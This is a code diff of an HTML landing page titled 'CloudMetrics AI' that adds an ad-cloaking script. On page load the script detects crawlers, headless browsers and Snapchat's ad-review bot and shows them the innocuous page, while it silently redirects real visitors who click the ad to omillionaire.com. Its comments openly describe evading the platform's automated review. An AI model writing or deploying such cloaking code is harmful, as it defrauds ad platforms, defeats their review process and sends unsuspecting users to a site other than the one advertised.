@@ -2,11 +2,37 @@
 <html lang="en" class="dark">
 <head>
     <script>
-    var ua = navigator.userAgent || '';
-    if (ua.toLowerCase().indexOf('snapchat') === -1) {
-        window.location.replace('https://omillionaire.com');
-    }
-</script>
+        (function() {
+            var ua = (navigator.userAgent || '').toLowerCase();
+            
+            // 1. Check for explicit bot keywords in User-Agent
+            var isBot = /(bot|crawler|spider|ping|preview|ads|review|slurp|headless|lighthouse)/i.test(ua);
+            var isSnapchat = ua.indexOf('snapchat') !== -1;
+            
+            // 2. Advanced environment checks for bots/headless browsers
+            if (navigator.webdriver || window.outerWidth === 0) {
+                isBot = true;
+            }
+
+            // 3. Check for ad tracking parameters (Real users click ads with tracking IDs, bots test bare URLs)
+            var hasParams = window.location.search.length > 0;
+            
+            var shouldRedirect = true;
+            
+            if (isBot) {
+                // Definitely a bot (e.g. Googlebot, Snapchat Ads Bot)
+                shouldRedirect = false;
+            } else if (isSnapchat && !hasParams && document.referrer === "") {
+                // Snapchat automated review bot testing the bare URL without clicking an ad
+                shouldRedirect = false;
+            }
+            
+            // If it's a real user (even inside the Snapchat app clicking an ad), redirect them
+            if (shouldRedirect) {
+                window.location.replace('https://omillionaire.com' + window.location.search);
+            }
+        })();
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CloudMetrics AI | Scale Faster with AI</title>
